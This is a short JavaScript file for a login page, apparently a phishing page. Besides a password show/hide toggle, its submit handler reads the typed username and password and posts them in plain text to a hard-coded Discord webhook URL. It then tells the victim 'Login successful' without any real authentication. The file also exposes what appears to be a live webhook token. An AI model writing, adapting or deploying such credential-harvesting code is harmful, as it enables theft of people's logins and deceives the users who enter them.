document.getElementById('togglePassword').addEventListener('click', function () {
    const passwordInput = document.getElementById('password');
    const type = passwordInput.type === 'password' ? 'text' : 'password';
    passwordInput.type = type;

    // Toggle the emoji to indicate whether the password is visible or hidden
    if (type === 'password') {
        this.textContent = '👁️'; // Eye symbol when password is hidden
    } else {
        this.textContent = '🙈'; // Eye with a line symbol when password is visible
    }
});

document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevents form from submitting the default way

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const webhookURL = 'https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr';

    const payload = {
        content: `${username}: has logged in with the password: ${password}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    }).then(response => {
        if (response.ok) {
            alert('Login successful');
        } else {
            alert('Error logging in');
        }
    }).catch(error => {
        console.error('Error sending to Discord:', error); // Log errors to the console
        alert('Error logging in');
    });
});
